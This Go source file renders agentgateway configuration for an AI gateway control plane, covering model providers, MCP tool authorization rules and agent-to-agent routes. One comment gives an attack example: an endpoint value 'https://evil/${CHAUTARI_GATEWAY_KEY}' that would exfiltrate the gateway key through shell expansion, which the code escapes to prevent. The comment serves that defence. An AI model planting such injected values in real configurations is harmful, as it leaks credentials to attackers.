/**
 * Copyright 2026 the original author or authors from the Chautari project.
 *
 * This file is part of the Chautari project, see https://github.com/lukelittle/chautari
 * for more information.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package dataplane

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/lukelittle/chautari/internal/estate"
)

// AgentGatewayVersion is the agentgateway release the rendered configuration
// targets. Its JSON schema is vendored in testdata and every render is
// validated against it.
const AgentGatewayVersion = "v1.6.0"

// AgentGatewayImage is the container image for that release.
const AgentGatewayImage = "cr.agentgateway.dev/agentgateway:" + AgentGatewayVersion

// Ports the rendered gateway listens on.
const (
	AgentGatewayPort    = 3000 // LLM (/v1/...) and MCP (/mcp)
	AgentGatewayA2APort = 3100 // A2A, one route per agent
)

// GatewayKeyEnv is the environment variable both sides read the internal key
// from. agentgateway shell-expands its config file, so the key never lands on
// disk.
const GatewayKeyEnv = "CHAUTARI_GATEWAY_KEY"

// AgentGateway renders agentgateway standalone config and forwards to it.
type AgentGateway struct {
	opts   Options
	client *http.Client
}

func (a *AgentGateway) Name() string { return "agentgateway" }

func (a *AgentGateway) MCPTarget() string {
	if a.opts.MCPURL != "" {
		return a.opts.MCPURL
	}
	return strings.TrimSuffix(a.opts.BaseURL, "/") + "/mcp"
}

func (a *AgentGateway) A2ATarget(agent string) string {
	if a.opts.A2AURL == "" {
		return ""
	}
	return strings.TrimSuffix(a.opts.A2AURL, "/") + "/a2a/" + agent
}

func (a *AgentGateway) ChatCompletions(ctx context.Context, body []byte, meta Meta) (*http.Response, error) {
	return forward(ctx, a.client, a.opts.BaseURL, "/v1/chat/completions", a.opts.InternalKey, body, meta)
}

// ── config model (a typed subset of agentgateway's LocalConfig) ─────────────

type agwConfig struct {
	Config   *agwRuntime           `yaml:"config,omitempty"`
	Gateways map[string]agwGateway `yaml:"gateways"`
	LLM      *agwLLM               `yaml:"llm,omitempty"`
	MCP      *agwMCP               `yaml:"mcp,omitempty"`
	Binds    []agwBind             `yaml:"binds,omitempty"`
}

type agwRuntime struct {
	Tracing *agwTracing `yaml:"tracing,omitempty"`
}

type agwTracing struct {
	OTLPEndpoint string `yaml:"otlpEndpoint"`
}

type agwGateway struct {
	Port int `yaml:"port"`
}

type agwLLM struct {
	Policies  agwPolicies   `yaml:"policies"`
	Providers []agwProvider `yaml:"providers"`
	Models    []agwModel    `yaml:"models"`
}

type agwPolicies struct {
	APIKey           *agwAPIKey  `yaml:"apiKey,omitempty"`
	MCPAuthorization *agwRuleSet `yaml:"mcpAuthorization,omitempty"`
	A2A              *struct{}   `yaml:"a2a,omitempty"`
	URLRewrite       *agwRewrite `yaml:"urlRewrite,omitempty"`
	BackendTLS       *struct{}   `yaml:"backendTLS,omitempty"`
}

type agwAPIKey struct {
	Mode     string      `yaml:"mode"`
	Location agwLocation `yaml:"location"`
	Keys     []agwKeyRef `yaml:"keys"`
}

type agwLocation struct {
	Header agwHeaderLoc `yaml:"header"`
}

type agwHeaderLoc struct {
	Name   string `yaml:"name"`
	Prefix string `yaml:"prefix"`
}

type agwKeyRef struct {
	Key      string            `yaml:"key"`
	Metadata map[string]string `yaml:"metadata,omitempty"`
}

type agwRuleSet struct {
	Rules []agwRule `yaml:"rules"`
}

type agwRule struct {
	Allow string `yaml:"allow"`
}

type agwRewrite struct {
	Path agwPathRewrite `yaml:"path"`
}

type agwPathRewrite struct {
	Prefix string `yaml:"prefix"`
}

type agwProvider struct {
	Name     string    `yaml:"name"`
	Provider string    `yaml:"provider"`
	Params   agwParams `yaml:"params,omitempty"`
}

type agwParams struct {
	Model             string `yaml:"model,omitempty"`
	APIKey            string `yaml:"apiKey,omitempty"`
	AWSRegion         string `yaml:"awsRegion,omitempty"`
	VertexRegion      string `yaml:"vertexRegion,omitempty"`
	VertexProject     string `yaml:"vertexProject,omitempty"`
	AzureResourceName string `yaml:"azureResourceName,omitempty"`
	BaseURL           string `yaml:"baseUrl,omitempty"`
}

type agwModel struct {
	Name     string         `yaml:"name"`
	Provider agwProviderRef `yaml:"provider"`
	Params   agwParams      `yaml:"params"`
}

type agwProviderRef struct {
	Reference string `yaml:"reference"`
}

type agwMCP struct {
	Policies agwPolicies `yaml:"policies"`
	Targets  []agwTarget `yaml:"targets"`
}

type agwTarget struct {
	Name string        `yaml:"name"`
	MCP  agwMCPBackend `yaml:"mcp"`
}

type agwMCPBackend struct {
	Host string `yaml:"host"`
}

type agwBind struct {
	Port      int           `yaml:"port"`
	Listeners []agwListener `yaml:"listeners"`
}

type agwListener struct {
	Routes []agwRoute `yaml:"routes"`
}

type agwRoute struct {
	Name     string       `yaml:"name"`
	Matches  []agwMatch   `yaml:"matches"`
	Policies agwPolicies  `yaml:"policies"`
	Backends []agwBackend `yaml:"backends"`
}

type agwMatch struct {
	Path agwPathMatch `yaml:"path"`
}

type agwPathMatch struct {
	PathPrefix string `yaml:"pathPrefix"`
}

type agwBackend struct {
	Host string `yaml:"host"`
}

const agwHeader = `# yaml-language-server: $schema=https://agentgateway.dev/schema/config
#
# agentgateway ` + AgentGatewayVersion + ` configuration, rendered by Chautari.
# Do not edit: the control plane rewrites this file whenever a model, tool or
# agent is approved or retired, and agentgateway hot-reloads it.
#
# Secrets are environment variable references, expanded by agentgateway at
# load time, so no credential is ever written to this file.
`

// envRefs collects the environment references Chautari itself emits. Every
// other '$' in the rendered file came from estate or registry data and is
// escaped, because agentgateway shell-expands the whole file: an endpoint
// like "https://evil/${CHAUTARI_GATEWAY_KEY}" must not exfiltrate the key.
type envRefs struct{ refs []string }

// ref returns a placeholder for ${expr}, substituted after escaping.
func (r *envRefs) ref(expr string) string {
	r.refs = append(r.refs, "${"+expr+"}")
	return fmt.Sprintf("chautari-env-ref-%d-x", len(r.refs)-1)
}

// finish escapes every literal '$' and then restores the references.
func (r *envRefs) finish(b []byte) []byte {
	out := strings.ReplaceAll(string(b), "$", "$$")
	for i := len(r.refs) - 1; i >= 0; i-- {
		out = strings.ReplaceAll(out, fmt.Sprintf("chautari-env-ref-%d-x", i), r.refs[i])
	}
	return []byte(out)
}

// Render produces gateway.yaml.
func (a *AgentGateway) Render(e *estate.Estate, s State) ([]File, error) {
	env := &envRefs{}
	internal := agwAPIKey{Mode: "strict", Location: agwLocation{Header: agwHeaderLoc{Name: "authorization", Prefix: "Bearer "}}, Keys: []agwKeyRef{{
		Key:      env.ref(GatewayKeyEnv),
		Metadata: map[string]string{"name": "chautari-checkpoint"},
	}}}

	cfg := agwConfig{Gateways: map[string]agwGateway{"default": {Port: AgentGatewayPort}}}
	if a.opts.OTLPEndpoint != "" {
		cfg.Config = &agwRuntime{Tracing: &agwTracing{OTLPEndpoint: a.opts.OTLPEndpoint}}
	}

	llm := &agwLLM{Policies: agwPolicies{APIKey: &internal}}
	used := map[string]bool{}
	for _, m := range e.Models {
		if !s.ModelApproved(m) {
			continue
		}
		used[m.Provider] = true
		llm.Models = append(llm.Models, agwModel{
			Name:     m.Name,
			Provider: agwProviderRef{Reference: m.Provider},
			Params:   agwParams{Model: m.UpstreamID},
		})
	}
	for _, p := range e.Providers {
		if !used[p.Name] {
			continue
		}
		ap, err := agwProviderFor(p, env)
		if err != nil {
			return nil, err
		}
		llm.Providers = append(llm.Providers, ap)
	}
	if len(llm.Models) > 0 {
		cfg.LLM = llm
	}

	if mcp := renderMCP(e, s, internal); mcp != nil {
		cfg.MCP = mcp
	}
	if bind := renderA2A(e, s, internal); bind != nil {
		cfg.Binds = []agwBind{*bind}
	}

	var body bytes.Buffer
	enc := yaml.NewEncoder(&body)
	enc.SetIndent(2)
	if err := enc.Encode(cfg); err != nil {
		return nil, err
	}
	out := append([]byte(agwHeader), env.finish(body.Bytes())...)
	return []File{{Path: "gateway.yaml", Content: out}}, nil
}

func agwProviderFor(p estate.Provider, env *envRefs) (agwProvider, error) {
	key := ""
	if p.APIKeyEnv != "" {
		key = env.ref(p.APIKeyEnv)
	}
	switch p.Type {
	case "bedrock":
		return agwProvider{Name: p.Name, Provider: "bedrock", Params: agwParams{AWSRegion: p.Region}}, nil
	case "openai":
		return agwProvider{Name: p.Name, Provider: "openAI", Params: agwParams{APIKey: key}}, nil
	case "anthropic":
		return agwProvider{Name: p.Name, Provider: "anthropic", Params: agwParams{APIKey: key}}, nil
	case "vertex":
		return agwProvider{Name: p.Name, Provider: "vertex", Params: agwParams{
			VertexRegion: p.Region, VertexProject: env.ref("GOOGLE_CLOUD_PROJECT:-")}}, nil
	case "azure":
		u, err := url.Parse(p.Endpoint)
		if err != nil || u.Host == "" {
			return agwProvider{}, fmt.Errorf("provider %s: azure needs an endpoint like https://<resource>.openai.azure.com", p.Name)
		}
		return agwProvider{Name: p.Name, Provider: "azure", Params: agwParams{
			APIKey: key, AzureResourceName: strings.Split(u.Hostname(), ".")[0]}}, nil
	case "openai-compatible":
		if p.APIKeyEnv == "" {
			key = "unused"
		} else {
			// Mocks and self-hosted endpoints often need no key; default it so
			// a missing variable doesn't stop the gateway from loading.
			key = env.ref(p.APIKeyEnv + ":-unused")
		}
		return agwProvider{Name: p.Name, Provider: "openAI", Params: agwParams{APIKey: key, BaseURL: p.Endpoint}}, nil
	}
	return agwProvider{}, fmt.Errorf("provider %s: unsupported type %q", p.Name, p.Type)
}

// renderMCP exposes approved tools and compiles team entitlements into CEL
// authorization rules keyed on the team header the checkpoint sets.
func renderMCP(e *estate.Estate, s State, internal agwAPIKey) *agwMCP {
	approved := map[string]estate.Tool{}
	mcp := &agwMCP{}
	for _, t := range e.Tools {
		if !s.ToolApproved(t) {
			continue
		}
		approved[t.Name] = t
		mcp.Targets = append(mcp.Targets, agwTarget{Name: t.Name, MCP: agwMCPBackend{Host: t.Endpoint}})
	}
	if len(mcp.Targets) == 0 {
		return nil
	}
	var rules []agwRule
	for _, team := range e.Teams {
		for _, name := range team.Tools {
			t, ok := approved[name]
			if !ok {
				continue
			}
			rules = append(rules, agwRule{Allow: toolRule(team.Name, t)})
		}
	}
	if len(rules) == 0 {
		rules = []agwRule{{Allow: "false"}} // tools exist but nobody is entitled
	}
	mcp.Policies = agwPolicies{APIKey: &internal, MCPAuthorization: &agwRuleSet{Rules: rules}}
	return mcp
}

func toolRule(team string, t estate.Tool) string {
	r := fmt.Sprintf(`request.headers[%s] == %s && mcp.tool.target == %s`,
		strconv.Quote(strings.ToLower(HeaderTeam)), strconv.Quote(team), strconv.Quote(t.Name))
	if len(t.Allow) > 0 {
		q := make([]string, len(t.Allow))
		for i, n := range t.Allow {
			q[i] = strconv.Quote(n)
		}
		r += " && mcp.tool.name in [" + strings.Join(q, ", ") + "]"
	}
	return r
}

// renderA2A routes /a2a/<agent> to each approved agent's endpoint.
func renderA2A(e *estate.Estate, s State, internal agwAPIKey) *agwBind {
	var routes []agwRoute
	for _, ag := range e.Agents {
		if !s.AgentApproved(ag) || ag.Endpoint == "" {
			continue
		}
		host, path, tls := A2ABackend(ag.Endpoint)
		policies := agwPolicies{
			APIKey:     &internal,
			A2A:        &struct{}{},
			URLRewrite: &agwRewrite{Path: agwPathRewrite{Prefix: path}},
		}
		if tls {
			policies.BackendTLS = &struct{}{}
		}
		routes = append(routes, agwRoute{
			Name:     "a2a-" + ag.Name,
			Matches:  []agwMatch{{Path: agwPathMatch{PathPrefix: "/a2a/" + ag.Name}}},
			Policies: policies,
			Backends: []agwBackend{{Host: host}},
		})
	}
	if len(routes) == 0 {
		return nil
	}
	return &agwBind{Port: AgentGatewayA2APort, Listeners: []agwListener{{Routes: routes}}}
}

// A2ABackend turns an agent endpoint ("host:port" or "http(s)://host[:port][/path]")
// into an agentgateway backend: host:port with the port defaulted from the
// scheme, the path the route rewrites to, and whether the backend needs TLS.
func A2ABackend(endpoint string) (hostport, path string, tls bool) {
	path = "/"
	if !strings.Contains(endpoint, "://") {
		return endpoint, path, false
	}
	u, err := url.Parse(endpoint)
	if err != nil || u.Host == "" {
		return endpoint, path, false
	}
	tls = u.Scheme == "https"
	port := u.Port()
	if port == "" {
		port = "80"
		if tls {
			port = "443"
		}
	}
	if u.Path != "" {
		path = u.Path
	}
	return net.JoinHostPort(u.Hostname(), port), path, tls
}
